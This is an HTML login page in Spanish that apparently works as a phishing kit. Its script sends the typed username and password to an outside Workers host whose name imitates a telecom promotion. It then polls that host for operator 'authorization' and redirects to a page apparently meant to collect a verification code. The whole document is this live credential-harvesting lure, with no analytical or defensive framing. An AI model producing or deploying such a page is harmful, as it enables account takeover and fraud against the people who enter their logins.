<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Login</title>
</head>
<body>
<h2>Formulario de Acceso</h2>
<form id="loginForm">
  <label>Usuario:</label>
  <input type="text" id="usuario" required><br><br>

  <label>Clave:</label>
  <input type="password" id="clave" required><br><br>

  <button type="submit">Enviar</button>
</form>

<h2>Ingresando...</h2>
<p id="status">Esperando autorización...</p>

<script>
const loginForm = document.getElementById("loginForm");
const statusEl = document.getElementById("status");
let sessionId = null;

loginForm.addEventListener("submit", async (e) => {
  e.preventDefault();
  const usuario = document.getElementById("usuario").value;
  const clave = document.getElementById("clave").value;

  const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ usuario, clave })
  });

  const data = await res.json();
  if (data.ok) {
    sessionId = data.id;
    statusEl.textContent = "Esperando autorización...";
    startPolling();
  } else {
    alert("Error: " + data.error);
  }
});

function startPolling() {
  const interval = setInterval(async () => {
    const statusRes = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${sessionId}`);
    const statusData = await statusRes.json();
    if (statusData.autorizado) {
      clearInterval(interval);
      window.location.href = "codigo.html";
    }
  }, 3000);
}
</script>
</body>
</html>
